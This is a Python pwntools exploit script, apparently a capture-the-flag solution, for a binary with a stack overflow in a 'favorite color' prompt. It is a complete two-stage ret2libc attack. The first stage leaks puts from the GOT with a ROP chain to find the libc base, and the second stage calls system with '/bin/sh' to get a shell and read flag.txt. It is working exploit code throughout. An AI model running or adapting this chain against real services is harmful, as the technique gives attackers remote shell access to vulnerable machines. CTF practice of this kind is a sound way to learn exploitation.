from pwn import *

elf = context.binary = ELF('./task_patched')
libc = ELF('./libc6_2.31-0ubuntu9.1_amd64.so')
rop = ROP(elf.path)
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]
RET = (rop.find_gadget(['ret']))[0]
WRITABLE = elf.get_section_by_name('.data').header.sh_addr + 0x100

if args.GDB:
	p = gdb.debug(elf.path, '\n'.join([
		"b *main",
		"c"
	]))
elif args.REMOTE:
	host, port = args.get("HOST", "localhost"), args.get("PORT", 5000)
	p = remote(host, port)
else:
	p = process(elf.path)

# https://libc.blukat.me/?q=puts%3A0x7fe30f40c5a0%2Csetvbuf%3A0x7fe30f40ce60&l=libc6_2.31-0ubuntu9.1_amd64

payload = b'A' * (16 + 8)
payload += p64(POP_RDI)
payload += p64(elf.got['puts'])

# call puts to leak puts address from GOT
payload += p64(elf.symbols['puts'])

# run function again
payload += p64(elf.symbols['ask'])
# payload += p64(0x201630)

p.sendlineafter(b"What is your favorite color? ", payload)
p.recvuntil(b"I don't like this color\n", drop=True)

leak_puts = p.recvline().strip().ljust(8, b'\x00')
leak_puts = u64(leak_puts)

print(f"puts leak: {hex(leak_puts)}")
libc_base = leak_puts - libc.symbols['puts']
libc.address = libc_base
print(f"libc base: {hex(libc_base)}")

p.recvuntil(b"What is your favorite color? ")
payload = b'A' * (16 + 8)
payload += p64(POP_RDI)
payload += p64(next(libc.search(b"/bin/sh\x00")))

payload += p64(RET)

# call system
payload += p64(libc.symbols['system'])

p.sendline(payload)
# p.interactive()

# p.recvuntil(b"I don't like this color\n", drop=True)
sleep(1)
p.sendline(b'cat flag.txt')

output = p.clean(1.0)
print(output)
